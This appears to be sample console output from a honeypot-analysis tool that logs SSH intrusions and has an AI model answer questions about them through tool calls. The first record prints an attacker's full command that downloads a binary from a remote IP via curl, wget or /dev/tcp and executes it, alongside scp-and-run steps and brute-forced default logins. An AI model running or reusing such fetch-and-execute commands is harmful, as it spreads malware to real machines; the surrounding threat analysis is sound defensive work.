Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 3, SSH: 2, Commands: 21, Cmdlogs: 1, 
#############################################################################################
#                                         source_ips                                        #
#############################################################################################
#                                                                                           #
# [SourceIP 47.120.37.43 Sessions: 3, Successful Logins: 1, Commands: 21, Zeek Events: 4, ] #
#                                                                                           #
#############################################################################################
##################
# uniq_dst_ports #
##################
#                #
# {2222}         #
#                #
##################
########################################################################################################################
#                                                       sessions                                                       #
########################################################################################################################
#                                                                                                                      #
# [Session CZTsog4mK2qlnX5z39 CONN 47.120.37.43:39554 -> 172.31.5.68:2222 Duration: 0.00s,                             #
#  Session ClTf1A34WgU8CTeDal SSH 47.120.37.43:37534 -> 172.31.5.68:2222 Duration: 0.00s,                              #
#  Session 3334db81db98 SSH 47.120.37.43:37534 -> 172.31.5.68:2222 Login: root:12345678 Commands: 21, Duration: 0.11s] #
#                                                                                                                      #
########################################################################################################################
########################################################################################################################
#                                                       commands                                                       #
########################################################################################################################
#                                                                                                                      #
# ['echo 1 && cat /bin/echo',                                                                                          #
#  'nohup $SHELL -c "curl http://108.181.122.221:60101/linux -o /tmp/1d0xrd25u0; '                                     #
#  'if [ ! -f /tmp/1d0xrd25u0 ]; then wget http://108.181.122.221:60101/linux -O '                                     #
#  '/tmp/1d0xrd25u0; fi; if [ ! -f /tmp/1d0xrd25u0 ]; then exec '                                                      #
#  "6<>/dev/tcp/108.181.122.221/60101 && echo -n 'GET /linux' >&6 && cat 0<&6 > "                                      #
#  '/tmp/1d0xrd25u0 && chmod +x /tmp/1d0xrd25u0 && /tmp/1d0xrd25u0 '                                                   #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==; '                                                                                                            #
#  'fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/1d0xrd25u0 && /tmp/1d0xrd25u0 '                                     #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==" '                                                                                                            #
#  '&',                                                                                                                #
#  'head -c 0 > /tmp/UVPRQdahjX',                                                                                      #
#  'chmod 777 /tmp/UVPRQdahjX',                                                                                        #
#  '/tmp/UVPRQdahjX '                                                                                                  #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==',                                                                                                             #
#  'cp /tmp/UVPRQdahjX /tmp/linux',                                                                                    #
#  'head -c 0 > /tmp/winminer_sign',                                                                                   #
#  'head -c 0 > /tmp/winminer',                                                                                        #
#  'head -c 0 > /tmp/linux_sign',                                                                                      #
#  'head -c 0 > /tmp/mipsel_linux_sign',                                                                               #
#  'head -c 0 > /tmp/mips_linux',                                                                                      #
#  'head -c 0 > /tmp/mips_linux_sign',                                                                                 #
#  'head -c 0 > /tmp/windows_sign',                                                                                    #
#  'head -c 0 > /tmp/arm_linux_sign',                                                                                  #
#  'head -c 0 > /tmp/miner',                                                                                           #
#  'head -c 0 > /tmp/mipsel_linux',                                                                                    #
#  'head -c 0 > /tmp/windows',                                                                                         #
#  'head -c 0 > /tmp/arm_linux',                                                                                       #
#  'head -c 0 > /tmp/miner_sign',                                                                                      #
#  '',                                                                                                                 #
#  'exit']                                                                                                             #
#                                                                                                                      #
########################################################################################################################
###########
# malware #
###########
#         #
# []      #
#         #
###########



Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 24, SSH: 20, Commands: 3, Cmdlogs: 4, Malware: 3 
#############################################################################################################
#                                                 source_ips                                                #
#############################################################################################################
#                                                                                                           #
# [SourceIP 93.223.169.159 Sessions: 10, Successful Logins: 2, Commands: 3, Downloads 1, Zeek Events: 14, , #
#  SourceIP 27.93.25.111 Sessions: 7, Successful Logins: 2, Commands: 3, Downloads 1, Zeek Events: 8, ,     #
#  SourceIP 111.216.194.148 Sessions: 7, Successful Logins: 2, Commands: 3, Downloads 1, Zeek Events: 8, ]  #
#                                                                                                           #
#############################################################################################################
##################
# uniq_dst_ports #
##################
#                #
# {22, 2222}     #
#                #
##################
########################################################################################################################
#                                                       sessions                                                       #
########################################################################################################################
#                                                                                                                      #
# [Session CmMj7Y1TLuJ5YCKDWl CONN 93.223.169.159:60702 -> 172.31.5.68:22 Duration: 0.00s,                             #
#  Session CTCt4bY4cLQCcH5Si SSH 93.223.169.159:47114 -> 172.31.5.68:22 Duration: 0.00s,                               #
#  Session CnN1Ae1hMulVtjCKi6 SSH 93.223.169.159:47118 -> 172.31.5.68:22 Duration: 0.00s,                              #
#  Session C06KgE3PnupO2F8u27 CONN 93.223.169.159:49808 -> 172.31.5.68:22 Duration: 0.00s,                             #
#  Session CQi9zfVW7vj47v0A9 SSH 93.223.169.159:46966 -> 172.31.5.68:22 Duration: 0.00s,                               #
#  Session Cz65Bp3E9Yx7GOGZf8 SSH 93.223.169.159:46970 -> 172.31.5.68:22 Duration: 0.00s,                              #
#  Session CkS27i1cg6LfTwb3Oi SSH 93.223.169.159:47004 -> 172.31.5.68:22 Duration: 0.00s,                              #
#  Session 76647820c016 SSH 93.223.169.159:46966 -> 172.31.5.68:2222 Duration: 0.35s,                                  #
#  Session fa6fb05e952d SSH 93.223.169.159:46970 -> 172.31.5.68:2222 Login: pi:raspberry Commands: 1, Malware: 1, Dura #
# tion: 0.87s,                                                                                                         #
#  Session 3383f6a6a93c SSH 93.223.169.159:47004 -> 172.31.5.68:2222 Login: pi:raspberry Commands: 2, Duration: 0.70s, #
#  Session C5rS7g4QnQp42gbcGd CONN 27.93.25.111:50916 -> 172.31.5.68:22 Duration: 0.00s,                               #
#  Session CMy02v1pudNB2CRKZ7 SSH 27.93.25.111:52094 -> 172.31.5.68:22 Duration: 0.00s,                                #
#  Session CKKbJDBalq1TZbmF6 SSH 27.93.25.111:52102 -> 172.31.5.68:22 Duration: 0.00s,                                 #
#  Session CHGw7y4ZZUIK7GA6De SSH 27.93.25.111:52146 -> 172.31.5.68:22 Duration: 0.00s,                                #
#  Session CYkNc83gU5wuP2Slq2 CONN 111.216.194.148:49512 -> 172.31.5.68:22 Duration: 0.00s,                            #
#  Session CT4tTu4hPvKdx6ZkLe SSH 111.216.194.148:52912 -> 172.31.5.68:22 Duration: 0.00s,                             #
#  Session CLMsKD2iQhsMaDU1nk SSH 111.216.194.148:52922 -> 172.31.5.68:22 Duration: 0.00s,                             #
#  Session C1Z4MD4DurN46YY8Ra SSH 111.216.194.148:52964 -> 172.31.5.68:22 Duration: 0.00s,                             #
#  Session b183188057b3 SSH 27.93.25.111:52094 -> 172.31.5.68:2222 Duration: 0.15s,                                    #
#  Session a9ffcecc6796 SSH 27.93.25.111:52102 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 1, Mal #
# ware: 1, Duration: 0.57s,                                                                                            #
#  Session 6c83f979e0b5 SSH 27.93.25.111:52146 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 2, Dur #
# ation: 0.46s,                                                                                                        #
#  Session 617df930d4a6 SSH 111.216.194.148:52912 -> 172.31.5.68:2222 Duration: 0.09s,                                 #
#  Session c0a95962c75a SSH 111.216.194.148:52922 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 1,  #
# Malware: 1, Duration: 0.52s,                                                                                         #
#  Session 9a98fb146784 SSH 111.216.194.148:52964 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 2,  #
# Duration: 0.28s]                                                                                                     #
#                                                                                                                      #
########################################################################################################################
##########################################################
#                        commands                        #
##########################################################
#                                                        #
# ['scp -t /tmp/BUwTrLEj',                               #
#  'cd /tmp && chmod +x BUwTrLEj && bash -c ./BUwTrLEj', #
#  './BUwTrLEj']                                         #
#                                                        #
##########################################################
########################################################################################################################
#                                                       malware                                                        #
########################################################################################################################
#                                                                                                                      #
# [Malware 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c: Size: 4766 bytes Type: application/octet- #
# stream Downloaded by: 93.223.169.159 Session fa6fb05e952d ,                                                          #
#  Malware 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51: Size: 4766 bytes Type: application/octet- #
# stream Downloaded by: 27.93.25.111 Session a9ffcecc6796 ,                                                            #
#  Malware b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f: Size: 4766 bytes Type: application/octet- #
# stream Downloaded by: 111.216.194.148 Session c0a95962c75a ]                                                         #
#                                                                                                                      #
########################################################################################################################

Honeypot AI Finished Successfully!    
    """,
    


    "analyze_write_export": """
honeypot-ai/run.sh -lfa --only-attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c --analyze --write --export
Starting honeypot-ai...

Loading attacks from attacks directory at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Loading Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x113bc8850>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x113d12590>
Processed 78 events (78 cowrie events, 0 zeek events). Found 3 source ips
Loaded Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
(3->3) - Removed 0 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 18: 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 <- b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f by malware_urls
Merged 0 attacks by out of 18 attempts (0.0000%) 
Merge Attacks Time: 0.0021s
(3->3) - Merged 0 attacks with shared attrs
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
(3->1) - Merged 2 attacks with shared sig regexes
Analyzing 1 attacks.
Getting log paths and counts.
Getting ipdata.
Getting data for 93.223.169.159 from isc
Getting data for 93.223.169.159 from whois
Getting data for 93.223.169.159 from cybergordon
Getting data for 93.223.169.159 from threatfox
Getting data for 93.223.169.159 from shodan
Getting data for 27.93.25.111 from isc
Getting data for 27.93.25.111 from whois
Getting data for 27.93.25.111 from cybergordon
Getting data for 27.93.25.111 from threatfox
Getting data for 27.93.25.111 from shodan
Getting data for 111.216.194.148 from isc
Getting data for 111.216.194.148 from whois
Getting data for 111.216.194.148 from cybergordon
Getting data for 111.216.194.148 from threatfox
Getting data for 111.216.194.148 from shodan
Getting mwdata.
Getting data for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c from malwarebazaar
Getting data for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c from threatfox
Getting data for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 from malwarebazaar
Getting data for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 from threatfox
Getting data for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f from malwarebazaar
Getting data for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f from threatfox
Getting data for 93.223.169.159 from urlhaus
Getting data for 93.223.169.159 from threatfox
Getting data for 27.93.25.111 from urlhaus
Getting data for 27.93.25.111 from threatfox
Getting data for 111.216.194.148 from urlhaus
Getting data for 111.216.194.148 from threatfox
Getting command explanations.
Getting OpenAI resp for message_hash 554a34bd591c612a2521bf473e7956f391d627820a1c6816eb68f118d50b23b3
Writing 554a34bd591c612a2521bf473e7956f391d627820a1c6816eb68f118d50b23b3 to db
Getting malware explanations.
Getting OpenAI resp for message_hash 6b2c514d30f230de6cbb2a79a5b8ca783db9d1b9892742fc976489fb6b045eeb
Writing 6b2c514d30f230de6cbb2a79a5b8ca783db9d1b9892742fc976489fb6b045eeb to db
Getting assistant answers.


Asking: What are the IP addresses and ports involved in the attack?
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_pQjOdZR3YIX8Pzm0Roejn3Tr
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_pQjOdZR3YIX8Pzm0Roejn3Tr

AI called tool: get_attack_attrs
with args: {'attrs': ['uniq_src_ips', 'uniq_src_ports', 'uniq_dst_ips', 'uniq_dst_ports']}

Submitting tool output: {'uniq_src_ips': {'93.223.169.159', '27.93.25.111', '111.216.194.148'}, 'uniq_src_ports': {46966, 46970, 47004, 52094, 52102, 52146, 52912, 52922, 52964}, 'uniq_dst_ips': {'172.31.5.68'}, 'uniq_dst_ports': {2222}}
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_pQjOdZR3YIX8Pzm0Roejn3Tr
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_pQjOdZR3YIX8Pzm0Roejn3Tr
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_pQjOdZR3YIX8Pzm0Roejn3Tr
Run run_pQjOdZR3YIX8Pzm0Roejn3Tr completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_pQjOdZR3YIX8Pzm0Roejn3Tr

 Done with: What are the IP addresses and ports involved in the attack?
Answer: The attack involved the following IP addresses and ports:

### Source IPs:
- 93.223.169.159
- 27.93.25.111
- 111.216.194.148

### Source Ports:
- 46966
- 46970
- 47004
- 52094
- 52102
- 52146
- 52912
- 52922
- 52964

### Destination IP:
- 172.31.5.68 (Internal IP of the honeypot)

### Destination Port:
- 2222 (SSH server port on the honeypot)


Asking: Summarize the Sessions involved in the attack.
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Kn3s3WsTgENwOkzUusdHaqRk
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Kn3s3WsTgENwOkzUusdHaqRk

AI called tool: get_attack_attrs
with args: {'attrs': ['sessions']}

Submitting tool output: {'sessions': [Session 76647820c016 SSH 93.223.169.159:46966 -> 172.31.5.68:2222 Duration: 0.35s, Session fa6fb05e952d SSH 93.223.169.159:46970 -> 172.31.5.68:2222 Login: pi:raspberry Commands: 1, Malware: 1, Duration: 0.87s, Session 3383f6a6a93c SSH 93.223.169.159:47004 -> 172.31.5.68:2222 Login: pi:raspberry Commands: 2, Duration: 0.70s, Session b183188057b3 SSH 27.93.25.111:52094 -> 172.31.5.68:2222 Duration: 0.15s, Session a9ffcecc6796 SSH 27.93.25.111:52102 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 1, Malware: 1, Duration: 0.57s, Session 6c83f979e0b5 SSH 27.93.25.111:52146 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 2, Duration: 0.46s, Session 617df930d4a6 SSH 111.216.194.148:52912 -> 172.31.5.68:2222 Duration: 0.09s, Session c0a95962c75a SSH 111.216.194.148:52922 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 1, Malware: 1, Duration: 0.52s, Session 9a98fb146784 SSH 111.216.194.148:52964 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 2, Duration: 0.28s]}
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Kn3s3WsTgENwOkzUusdHaqRk
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Kn3s3WsTgENwOkzUusdHaqRk
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Kn3s3WsTgENwOkzUusdHaqRk
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Kn3s3WsTgENwOkzUusdHaqRk
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Kn3s3WsTgENwOkzUusdHaqRk
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Kn3s3WsTgENwOkzUusdHaqRk
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Kn3s3WsTgENwOkzUusdHaqRk
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_Kn3s3WsTgENwOkzUusdHaqRk
Run run_Kn3s3WsTgENwOkzUusdHaqRk completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_Kn3s3WsTgENwOkzUusdHaqRk

 Done with: Summarize the Sessions involved in the attack.
Answer: The following sessions were involved in the attack:

1. **Session ID:** 76647820c016  
   **Type:** SSH  
   **Source:** 93.223.169.159:46966  
   **Destination:** 172.31.5.68:2222  
   **Duration:** 0.35s  
   **Notes:** No successful login or commands recorded.

2. **Session ID:** fa6fb05e952d  
   **Type:** SSH  
   **Source:** 93.223.169.159:46970  
   **Destination:** 172.31.5.68:2222  
   **Login:** pi:raspberry  
   **Commands:** 1  
   **Malware:** 1  
   **Duration:** 0.87s

3. **Session ID:** 3383f6a6a93c  
   **Type:** SSH  
   **Source:** 93.223.169.159:47004  
   **Destination:** 172.31.5.68:2222  
   **Login:** pi:raspberry  
   **Commands:** 2  
   **Duration:** 0.70s

4. **Session ID:** b183188057b3  
   **Type:** SSH  
   **Source:** 27.93.25.111:52094  
   **Destination:** 172.31.5.68:2222  
   **Duration:** 0.15s  
   **Notes:** No successful login or commands recorded.

5. **Session ID:** a9ffcecc6796  
   **Type:** SSH  
   **Source:** 27.93.25.111:52102  
   **Destination:** 172.31.5.68:2222  
   **Login:** pi:raspberryraspberry993311  
   **Commands:** 1  
   **Malware:** 1  
   **Duration:** 0.57s

6. **Session ID:** 6c83f979e0b5  
   **Type:** SSH  
   **Source:** 27.93.25.111:52146  
   **Destination:** 172.31.5.68:2222  
   **Login:** pi:raspberryraspberry993311  
   **Commands:** 2  
   **Duration:** 0.46s

7. **Session ID:** 617df930d4a6  
   **Type:** SSH  
   **Source:** 111.216.194.148:52912  
   **Destination:** 172.31.5.68:2222  
   **Duration:** 0.09s  
   **Notes:** No successful login or commands recorded.

8. **Session ID:** c0a95962c75a  
   **Type:** SSH  
   **Source:** 111.216.194.148:52922  
   **Destination:** 172.31.5.68:2222  
   **Login:** pi:raspberryraspberry993311  
   **Commands:** 1  
   **Malware:** 1  
   **Duration:** 0.52s

9. **Session ID:** 9a98fb146784  
   **Type:** SSH  
   **Source:** 111.216.194.148:52964  
   **Destination:** 172.31.5.68:2222  
   **Login:** pi:raspberryraspberry993311  
   **Commands:** 2  
   **Duration:** 0.28s

It appears that multiple login attempts occurred with varying degrees of success across different sessions and IPs. Some sessions were associated with the download or upload of malware, along with command executions.


Asking: Analyze the SSH/Telnet sessions in the context of the attack. Include the usernames, passwords, ssh hasshes, and any other relevant.
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_oCrub2zaHFMc5keYYSdIogFx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_oCrub2zaHFMc5keYYSdIogFx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_oCrub2zaHFMc5keYYSdIogFx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_oCrub2zaHFMc5keYYSdIogFx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_oCrub2zaHFMc5keYYSdIogFx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_oCrub2zaHFMc5keYYSdIogFx
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_oCrub2zaHFMc5keYYSdIogFx

AI called tool: get_session_attrs
with args: {'session_id': '76647820c016', 'attrs': ['username', 'password', 'ssh_hassh']}

Submitting tool output: {'username': None, 'password': None, 'ssh_hassh': 'ec7378c1a92f5a8dde7e8b7a1ddf33d1'}

AI called tool: get_session_attrs
with args: {'session_id': 'fa6fb05e952d', 'attrs': ['username', 'password', 'ssh_hassh']}

Submitting tool output: {'username': 'pi', 'password': 'raspberry', 'ssh_hassh': 'ec7378c1a92f5a8dde7e8b7a1ddf33d1'}

AI called tool: get_session_attrs
with args: {'session_id': '3383f6a6a93c', 'attrs': ['username', 'password', 'ssh_hassh']}

Submitting tool output: {'username': 'pi', 'password': 'raspberry', 'ssh_hassh': 'ec7378c1a92f5a8dde7e8b7a1ddf33d1'}

AI called tool: get_session_attrs
with args: {'session_id': 'b183188057b3', 'attrs': ['username', 'password', 'ssh_hassh']}

Submitting tool output: {'username': None, 'password': None, 'ssh_hassh': 'ec7378c1a92f5a8dde7e8b7a1ddf33d1'}

AI called tool: get_session_attrs
with args: {'session_id': 'a9ffcecc6796', 'attrs': ['username', 'password', 'ssh_hassh']}

Submitting tool output: {'username': 'pi', 'password': 'raspberryraspberry993311', 'ssh_hassh': 'ec7378c1a92f5a8dde7e8b7a1ddf33d1'}

AI called tool: get_session_attrs
with args: {'session_id': '6c83f979e0b5', 'attrs': ['username', 'password', 'ssh_hassh']}

Submitting tool output: {'username': 'pi', 'password': 'raspberryraspberry993311', 'ssh_hassh': 'ec7378c1a92f5a8dde7e8b7a1ddf33d1'}

AI called tool: get_session_attrs
with args: {'session_id': '617df930d4a6', 'attrs': ['username', 'password', 'ssh_hassh']}

Submitting tool output: {'username': None, 'password': None, 'ssh_hassh': 'ec7378c1a92f5a8dde7e8b7a1ddf33d1'}

AI called tool: get_session_attrs
with args: {'session_id': 'c0a95962c75a', 'attrs': ['username', 'password', 'ssh_hassh']}

Submitting tool output: {'username': 'pi', 'password': 'raspberryraspberry993311', 'ssh_hassh': 'ec7378c1a92f5a8dde7e8b7a1ddf33d1'}

AI called tool: get_session_attrs
with args: {'session_id': '9a98fb146784', 'attrs': ['username', 'password', 'ssh_hassh']}

Submitting tool output: {'username': 'pi', 'password': 'raspberryraspberry993311', 'ssh_hassh': 'ec7378c1a92f5a8dde7e8b7a1ddf33d1'}
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_oCrub2zaHFMc5keYYSdIogFx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_oCrub2zaHFMc5keYYSdIogFx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_oCrub2zaHFMc5keYYSdIogFx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_oCrub2zaHFMc5keYYSdIogFx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_oCrub2zaHFMc5keYYSdIogFx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_oCrub2zaHFMc5keYYSdIogFx
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_oCrub2zaHFMc5keYYSdIogFx
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_oCrub2zaHFMc5keYYSdIogFx
Run run_oCrub2zaHFMc5keYYSdIogFx completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_oCrub2zaHFMc5keYYSdIogFx

 Done with: Analyze the SSH/Telnet sessions in the context of the attack. Include the usernames, passwords, ssh hasshes, and any other relevant.
Answer: Below is the analysis of SSH/Telnet sessions in the context of the attack, including usernames, passwords, and SSH hasshes:

1. **Session ID:** 76647820c016  
   **Username:** N/A  
   **Password:** N/A  
   **SSH hassh:** ec7378c1a92f5a8dde7e8b7a1ddf33d1  
   **Notes:** No login attempt recorded.

2. **Session ID:** fa6fb05e952d  
   **Username:** pi  
   **Password:** raspberry  
   **SSH hassh:** ec7378c1a92f5a8dde7e8b7a1ddf33d1  

3. **Session ID:** 3383f6a6a93c  
   **Username:** pi  
   **Password:** raspberry  
   **SSH hassh:** ec7378c1a92f5a8dde7e8b7a1ddf33d1  

4. **Session ID:** b183188057b3  
   **Username:** N/A  
   **Password:** N/A  
   **SSH hassh:** ec7378c1a92f5a8dde7e8b7a1ddf33d1  
   **Notes:** No login attempt recorded.

5. **Session ID:** a9ffcecc6796  
   **Username:** pi  
   **Password:** raspberryraspberry993311  
   **SSH hassh:** ec7378c1a92f5a8dde7e8b7a1ddf33d1  

